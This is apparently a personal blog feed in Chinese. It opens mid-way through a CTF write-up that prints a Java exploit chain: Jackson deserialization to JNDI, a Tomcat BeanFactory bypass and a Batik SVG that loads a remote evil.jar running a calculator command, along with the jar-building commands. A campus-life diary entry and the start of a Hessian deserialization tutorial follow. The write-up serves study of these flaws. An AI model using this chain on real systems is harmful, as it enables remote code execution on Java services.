InstantiationException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> unsafe.allocateInstance(c);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypassModule</span><span class="params">(Class src, Class dst)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getModule</span> <span class="operator">=</span> dst.getDeclaredMethod(<span class="string">&quot;getModule&quot;</span>);</span><br><span class="line">        getModule.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">module</span> <span class="operator">=</span> getModule.invoke(dst);</span><br><span class="line">        <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.getAndSetObject(src, addr, <span class="keyword">module</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            unsafe = (Unsafe)field.get((Object)<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var1) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里是用的jackson原生的反序列化来打的然后入口是EventListenerList去触发toString然后利用jackson反序列化会调用getter的特性触发getconnection方法调用lookup方法。</p><img src="/post/e5e27309/IMAGE20250221213224950.png" class=""><img src="/post/e5e27309/IMAGE20250221213242950.png" class=""><p>然后在poc上面的一部分做一下解释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnIndexes&quot;</span>),vector1);    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnNames&quot;</span>),vector2);    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;metaData&quot;</span>),metaData);    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;reader&quot;</span>),<span class="literal">null</span>);    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;writer&quot;</span>),<span class="literal">null</span>);    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;syncProvider&quot;</span>),<span class="literal">null</span>); </span><br></pre></td></tr></table></figure><p>这里是连接时需要设置的参数，否则就会报错。然后其实到这里就已经可以发起外部请求了，但是因为时jdk17，所以需要绕过jndi不能远程加载的问题，之前浅蓝师傅的一篇<a href="https://tttang.com/archive/1405/#toc_tomcat-jdbc">文章</a>介绍了很多种高版本绕过jdk的手法可以去寻找看看,不过发现好像文章中介绍的在此题中版本不一样没法利用。</p><p>tomcat高版本 虽然对<code>toString</code>做了限制但是可以通过<code>JavaBeans Introspector</code> 实现获取任意类的bean之后就可以调用任意类的的setter方法 而且可以实现<strong>任意传参</strong>所以我们可以通过 <code>BeanFactory</code>实现<strong>调用任意setter方法并且传参</strong>获取JavaBean的<code>WriteMethod</code>也就是所有<code>setter</code>方法<br> <a href="https://xz.aliyun.com/news/16156">https://xz.aliyun.com/news/16156</a></p><p>这里利用的是<code>org.apache.batik.swing.JSVGCanvas.setURI</code>并且lib中存在依赖。具体原理参考：<br><a href="https://mp.weixin.qq.com/s/fZtDvpyAo-UZRE9MhfB0VQ">https://mp.weixin.qq.com/s/fZtDvpyAo-UZRE9MhfB0VQ</a><br><a href="https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ">https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ</a><br>然后结合一个20年前的漏洞 svg打rce<br><a href="https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html">https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html</a></p><p>记录下payload</p><p>svg</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span>    </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;application/java-archive&quot;</span> <span class="attr">xlink:href</span>=<span class="string">&quot;http://127.0.0.1:81/evil.jar&quot;</span>&gt;</span>    </span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>RMIserver</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;    </span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;    </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;    </span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;    </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;    </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;    </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;    </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);    </span><br><span class="line">    </span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.apache.batik.swing.JSVGCanvas&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,    </span><br><span class="line">                <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);    </span><br><span class="line">    </span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;URI=test&quot;</span>));    </span><br><span class="line">    </span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;URI&quot;</span>, <span class="string">&quot;http://127.0.0.1:7001/calc.svg&quot;</span>));    </span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);    </span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.svg.EventListenerInitializer;    </span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.svg.SVGDocument;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SVGHandler</span> <span class="keyword">implements</span> <span class="title class_">EventListenerInitializer</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SVGHandler</span><span class="params">()</span> &#123;&#125;    </span><br><span class="line">    <span class="meta">@Override</span>    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initializeEventListeners</span><span class="params">(SVGDocument svgDocument)</span> &#123;    </span><br><span class="line">        <span class="keyword">try</span>&#123;    </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);    </span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;    </span><br><span class="line">    </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要实现EventListenerInitializer接口的原因在于svg在进行加载jar文件的时候进行了强转</p><img src="/post/e5e27309/IMAGE20250221214715766.png" class=""><p>下面将该java文件编译成jar，先导入依赖</p><img src="/post/e5e27309/IMAGE20250221214745645.png" class=""><p>然后编写<br>META-INF/MANIFEST.MF</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span>    </span><br><span class="line">SVG-Handler-Class: SVGHandler</span><br></pre></td></tr></table></figure><img src="/post/e5e27309/IMAGE20250221214839470.png" class=""><p>最后编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac -cp /Users/ocean/Downloads/xml-apis-ext-1.3.04.jar SVGHandler.java</span><br><span class="line">jar cmf /Users/ocean/Cybersecurity/Java_project/svg_rce/src/main/resources/META-INF/MANIFEST.MF evil.jar SVGHandler.class</span><br></pre></td></tr></table></figure><p>然后将svg 和 evil.jar分别放在不同的端口服务上就可以打成功了</p><img src="/post/e5e27309/IMAGE20250221215035253.png" class=""><p>参考：<br><a href="https://nlrvana.github.io/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E8%B5%9B-jdbcparty/#0x02-jdk%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87jndi">https://nlrvana.github.io/系统安全防护赛-jdbcparty/#0x02-jdk高版本绕过jndi</a><br><a href="https://j1rry-learn.github.io/posts/%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E8%B5%9Bjdbcparty-%E5%AD%A6%E4%B9%A0%E9%AB%98%E7%89%88%E6%9C%ACjdk%E5%92%8C%E9%AB%98%E7%89%88%E6%9C%ACtomcat%E6%89%93jndi%E5%88%B0rce">https://j1rry-learn.github.io/posts/从系统安全防护赛jdbcparty-学习高版本jdk和高版本tomcat打jndi到rce</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;钓鱼邮件&quot;&gt;钓鱼邮件&lt;/h2&gt;
&lt;p&gt;这题是签到题，给了一个邮件，我是用的飞书打开的&lt;/p&gt;
&lt;img src=&quot;/post/e5e27309/IMAGE20250106121545994.png&quot; class=&quot;&quot;&gt;
&lt;p&gt;这里面有一个附件打开需要密码可以看到提</summary>
      
    
    
    
    <category term="CTF" scheme="https://oceanzbz.github.io/categories/CTF/"/>
    
    
    <category term="CTFWP" scheme="https://oceanzbz.github.io/tags/CTFWP/"/>
    
  </entry>
  
  <entry>
    <title>图书馆学习日记</title>
    <link href="https://oceanzbz.github.io/post/499b5c8b.html"/>
    <id>https://oceanzbz.github.io/post/499b5c8b.html</id>
    <published>2025-01-03T11:04:45.000Z</published>
    <updated>2025-03-05T07:24:36.802Z</updated>
    
    <content type="html"><![CDATA[<p>为什么会有这个图书馆日记呢，这个说来话长，其实也是因为自己菜懒不想动。其实最终还是因为那句话 “既怕兄弟过的苦，又怕兄弟开路虎”。这不我们宿舍我们称其为”gay🥷“，由于是期末周，其实去复习也正常，但是这里为什么我要写写这位呢，那就是当初我们一起吃饭的时候他说：“躺就完了，我又不拿那奖学金，学啥？学个🥚”。爷们信了，今天发现爷们和209最牛逼的男人被骗了，这位🥷每天早早的背着书包就出门了，到晚上22:00才回来，不行爷们这游戏打的难受呐，于是叫上209的pwn👴一起去图书馆学习，看着是到那了，这知识他不进🧠啊，于是爷们就硬背，背完英语，背政治，最后背的头昏脑胀的，头疼难受，爷们跟“209最牛逼的男人”和pwn👴说走吧吃饭去，遂就回来了。</p><img src="/post/499b5c8b/IMAGE20250103191427378.png" class=""><p>以图为证爷们确实去图书馆了，不过好像也只是去了。最后在喷一句这期末考试，要命呐！！！</p><p>补充：在🥷看到这篇文章之后回复了一个“6”字</p><img src="/post/499b5c8b/IMAGE20250104154852579.png" class=""><p>具体原因也没说什么，于是乎209最牛逼的男人问他才得出他为什么回来这么晚，原来是他要做论文实验，时间紧急，看来是我们误会这位🥷了，在此跟他说一句：“你怎么不早说，当初在群里问你和我们搞抽象”，到此为止，图书馆的学习日记就到此为止吧，因为我们要去打游戏去了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;为什么会有这个图书馆日记呢，这个说来话长，其实也是因为自己菜懒不想动。其实最终还是因为那句话 “既怕兄弟过的苦，又怕兄弟开路虎”。这不我们宿舍我们称其为”gay🥷“，由于是期末周，其实去复习也正常，但是这里为什么我要写写这位呢，那就是当初我们一起吃饭的时候他说：“躺就完了</summary>
      
    
    
    
    <category term="闲谈" scheme="https://oceanzbz.github.io/categories/%E9%97%B2%E8%B0%88/"/>
    
    
    <category term="闲聊" scheme="https://oceanzbz.github.io/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>Hessian反序列化</title>
    <link href="https://oceanzbz.github.io/post/257d1196.html"/>
    <id>https://oceanzbz.github.io/post/257d1196.html</id>
    <published>2025-01-01T08:25:28.000Z</published>
    <updated>2025-03-05T07:24:36.791Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>Hessian 是 <a href="https://caucho.com/">caucho</a> 公司的工程项目，为了达到或超过 ORMI/Java JNI 等其他跨语言/平台调用的能力设计而出，在 2004 点发布 1.0 规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0 之后，采用了新的 2.0 版本的协议，一般称之为 Hessian 2.0。</p><p>这是一种动态类型的<a href="http://hessian.caucho.com/doc/hessian-serialization.html">二进制序列化</a>和 <a href="http://hessian.caucho.com/doc/hessian-ws.html">Web 服务</a>协议，专为面向对象的传输而设计。Hessian 协议在设计时，重点的几个目标包括了：必须尽可能的快、必须尽可能紧凑、跨语言、不需要外部模式或接口定义等等。</p><p>对于这样的设计，caucho 公司其实提供了两种解决方案，一个是 Hession，一个是 Burlap。Hession 是基于二进制的实现，传输数据更小更快，而 Burlap 的消息是 XML 的，有更好的可读性。两种数据都是基于 HTTP 协议传输。</p><p>Hessian 本身作为 <a href="https://caucho.com/products/resin">Resin</a> 的一部分，但是它的 <code>com.caucho.hessian.client</code> 和 <code>com.caucho.hessian.server</code> 包不依赖于任何其他的 Resin 类，因此它也可以使用任何容器如 Tomcat 中，也可以使用在 EJB 中。事实上很多通讯框架都使用或支持了这个规范来序列化及反序列化类。</p><p>作为一个二进制的序列化协议，Hessian 自行定义了一套自己的储存和还原数据的机制。对 8 种基础数据类型、3 种递归类型、ref 引用以及 Hessian 2.0 中的内部引用映射进行了相关定义。这样的设计使得 Hassian 可以进行跨语言跨平台的调用。</p><p>引用自su18师傅的介绍<a href="https://su18.org/post/hessian/#%E4%BA%8C-%E4%BB%8B%E7%BB%8D">https://su18.org/post/hessian/#%E4%BA%8C-%E4%BB%8B%E7%BB%8D</a></p><h2 id="RPC协议">RPC协议</h2><p>RPC全称为Remote Procedure Call Protocol（远程调用协议），RPC和之前学的RMI十分类似，都是远程调用服务，它们不同之处就是RPC是通过标准的二进制格式来定义请求的信息，这样跨平台和系统就更加方便<br>RPC协议的一次远程通信过程如下</p><ul><li>客户端发起请求，并按照RPC协议格式填充信息</li><li>填充完毕后将二进制格式文件转化为流，通过传输协议进行传输</li><li>服务端接收到流后，将其转换为二进制格式文件，并按照RPC协议格式获取请求的信息并进行处理</li><li>处理完毕后将结果按照RPC协议格式写入二进制格式文件中并返回<br>引用自boogipop师傅的博客：<a href="https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#RPC%E5%8D%8F%E8%AE%AE">https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#RPC%E5%8D%8F%E8%AE%AE</a></li></ul><h2 id="简单使用">简单使用</h2><p>环境依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建一个Person类并实现序列化接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建一个Hessian序列化和反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_stu</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);  </span><br><span class="line">        output.writeObject(o);  </span><br><span class="line">        System.out.println(bao.toString());  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> (T) o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        person.setAge(<span class="number">18</span>);  </span><br><span class="line">        person.setName(<span class="string">&quot;Feng&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] s = serialize(person);  </span><br><span class="line">        System.out.println((Person) deserialize(s));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/257d1196/IMAGE20241231163231453.png" class=""><p>再来和Java原生序列化对比一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T t) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);  </span><br><span class="line">        oos.writeObject(t);  </span><br><span class="line">        System.out.println(bao.toString());  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span>  <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bai);  </span><br><span class="line">        <span class="keyword">return</span> (T) ois.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        person.setAge(<span class="number">18</span>);  </span><br><span class="line">        person.setName(<span class="string">&quot;Feng&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] s=serialize(person);  </span><br><span class="line">        System.out.println((Person) deserialize(s));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/257d1196/IMAGE20241231163340658.png" class=""><p>这里对比就可以出来Hessian的序列化的数据长度比Java原生的序列化要短。</p><h2 id="Hessian反序列化漏洞分析">Hessian反序列化漏洞分析</h2><p>这里我们调试一下Hessian反序列化的流程看一下</p><img src="/post/257d1196/IMAGE20241231163753010.png" class=""><p>这里要先跟进这个read()方法</p><img src="/post/257d1196/IMAGE20241231163815867.png" class=""><p>这里会返回77这个Ascii码为什么呢？这里其实是因为在Hessian序列化对象的时候总是会将结果处理成一个Map所以序列化结果的第一个byte总是M而它的Ascii码就是77</p><img src="/post/257d1196/IMAGE20241231164125221.png" class=""><p>这里向下走就会进入到M这个case里我们跟进readType方法</p><img src="/post/257d1196/IMAGE20241231164344199.png" class=""><img src="/post/257d1196/IMAGE20241231164401216.png" class=""><p>这里就是获取我们序列化进去的Person对象的类型，继续回到原来的位置跟进readMap方法</p><img src="/post/257d1196/IMAGE20241231164449298.png" class=""><p>这里会先根据类型获取一个反序列化器，如果获取不到就使用_hashMapDeserializer来进行readMap，如果他也为null就新建一个HashMap类的反序列化器调用readMap方法。这里我们能够获取到Person的反序列化器跟进去看看</p><img src="/post/257d1196/IMAGE20241231165052187.png" class=""><p>先实例化instantiate对象然后返回readMap跟进去看看</p><img src="/post/257d1196/IMAGE20241231165519755.png" class=""><p>这里会循环获取Person对象中属性的值，然后resolve解析成Person对象。这就是一个正常对象的反序列化流程。</p><p>下面来看看恶意的链是怎么触发的我们手动给他赋值让其走到最后一个逻辑看看会调用哪个readMap里</p><img 